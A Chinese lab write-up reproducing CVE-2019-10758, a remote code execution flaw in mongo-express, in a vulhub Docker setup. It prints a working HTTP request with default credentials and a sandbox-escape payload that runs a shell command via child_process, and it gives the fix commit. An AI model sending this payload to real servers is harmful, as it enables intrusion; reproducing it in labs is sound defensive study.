## **漏洞简介：**

此软件包的受影响版本容易受到使用toBSON方法的端点通过远程执行代码（RCE）攻击的攻击。 在非安全环境中滥用vm依赖关系来执行exec命令。
默认用户名是admin，密码是pass。

## **威胁类型**

远程代码执行

## **威胁等级**

高

## **漏洞编号**

CVE-2019-10758

## **受影响系统及应用版本**

mongo-express，版本0.54.0及更低版本

### **不受影响的版本**

mongo-express 0.54.0或更高版本。

## **漏洞复现：**

这个漏洞环境感觉vulhub的就可以满足，所以选择搭建vulhub的环境

vulhub下载

    
    
     git clone https://github.com.cnpmjs.org/vulhub/vulhub

这里还有个 **小福利** ，有没有觉得经常git clone的时候特别慢？几K、十几K的下载?

为了解决这个问题，尝试了好多方法，总结了一个最有效的方法

git clone的时候在
**把https://github.com换成：[https://github.com.cnpmjs.org/](https://github.com.cnpmjs.org/%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9B%BD%E5%86%85%E7%9A%84github%E9%95%9C%E5%83%8F%E7%AB%99%EF%BC%8C%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6..%E6%80%8E%E4%B9%88%E8%AF%B4)**

这是一个国内的github镜像站，下载速度..怎么说呢，起飞！ **  
![](https://image.3001.net/images/20200803/1596436474.png!small)**

安装docker（我之前安装过）
**![](https://image.3001.net/images/20200803/1596436808.png!small)**

安装docker-compose

    
    
    pip install docker-compose

**![](https://image.3001.net/images/20200803/1596436831.png!small)**

启用docker，拉取镜像，启动环境

**PS** :这就又要说一个 **福利** 了，docker pull的时候有没有感觉很慢？放着阿里这么大的靠山得用起来呀

[https://cr.console.aliyun.com/#/accelerator](https://links.jianshu.com/go?to=https%3A%2F%2Fcr.console.aliyun.com%2F%23%2Faccelerator)

登录阿里云进去，左下角有个docker镜像加速，按步骤来，然后...起飞！！

（都是一个坑一个坑摸出来的...）

![](https://image.3001.net/images/20200803/1596436917.png!small)

至此环境搭建成功！

**环境启动后，访问http://192.168.192.128:8081即可查看到Web页面。**![](https://image.3001.net/images/20200803/1596437242.png!small)

**攻击复现：**

直接发送如下数据包，即可执行代码

    
    
    POST /checkValid HTTP/1.1
    
    Host: your-ip
    
    Accept-Encoding: gzip, deflate
    
    Accept: */*
    
    Accept-Language: en
    
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    
    Connection: close
    
    Authorization: Basic YWRtaW46cGFzcw==
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 124
    
     
    
    document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")

![](https://image.3001.net/images/20200803/1596437337.png!small)

**Poc** **目标：在/tcp下创建success文件**

**发送数据包后访问
http://localhost:8081**![](https://image.3001.net/images/20200803/1596437356.png!small)

**查看是否创建成功：**

    
    
    docker-compose exec web ls /tmp

![](https://image.3001.net/images/20200803/1596437409.png!small)成功创建uccess文件，都到这一步了，还能做什么自由发挥~

**ps：此文章仅用于交流学习~**

## **2** **、修复建议**

**https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2**

******在0.54.0中将bson.js中的vm依赖删除，改用mongo-query-parser**

![](https://image.3001.net/images/20200803/1596437436.png!small)

